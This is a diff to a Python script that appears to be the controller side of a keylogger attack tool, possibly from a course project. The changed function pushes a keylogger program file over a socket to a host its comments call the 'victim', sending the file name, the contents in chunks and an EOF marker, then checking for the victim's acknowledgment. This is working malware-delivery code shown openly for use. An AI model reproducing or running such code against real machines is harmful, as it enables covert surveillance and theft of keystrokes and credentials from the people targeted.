@@ -2,6 +2,8 @@ import getopt
 import os
 import sys
 import socket
+import time
+
 import constants
 import ipaddress
 
@@ -229,28 +231,38 @@ def disconnect_from_client(sockets_list: list, connected_clients: dict):
 
 
 def transfer_keylog_program(sock: socket.socket, dest_ip: str, dest_port: int):
-    # Send to victim a notification that it is transferring a file
+    # Send the notification to the victim that a file transfer is about to occur
     sock.send(constants.TRANSFER_KEYLOG_MSG.encode())
     ack = sock.recv(constants.BYTE_LIMIT).decode()
 
+    # Open and Read the file to be sent
     if ack == constants.RECEIVED_CONFIRMATION_MSG:
         # Send file name
         sock.send(constants.KEYLOG_FILE_NAME.encode())
         print(constants.FILE_NAME_TRANSFER_MSG.format(constants.KEYLOG_FILE_NAME))
 
-        # Open and Read the file to be sent
+        # Wait for client/victim to buffer
+        time.sleep(1)
+
         with open(constants.KEYLOG_FILE_NAME, 'rb') as file:
             while True:
-                data = file.read(constants.BYTE_LIMIT)
-                if not data:
+                file_data = file.read(constants.BYTE_LIMIT)
+                if not file_data:
                     break
-                sock.send(data)
+                sock.send(file_data)
 
-        sock.send(constants.END_OF_FILE_SIGNAL)
+        # Send end-of-file marker
+        sock.send(b"EOF")
 
-        print(constants.FILE_TRANSFER_SUCCESSFUL.format(constants.KEYLOG_FILE_NAME,
-                                                        dest_ip,
-                                                        dest_port))
+        # Get an ACK from victim for success
+        transfer_result = sock.recv(constants.BYTE_LIMIT).decode()
+
+        if transfer_result == constants.VICTIM_ACK:
+            print(constants.FILE_TRANSFER_SUCCESSFUL.format(constants.KEYLOG_FILE_NAME,
+                                                            dest_ip,
+                                                            dest_port))
+        else:
+            print(constants.FILE_TRANSFER_ERROR.format(transfer_result))
 
 
 def is_file_openable(file_path):
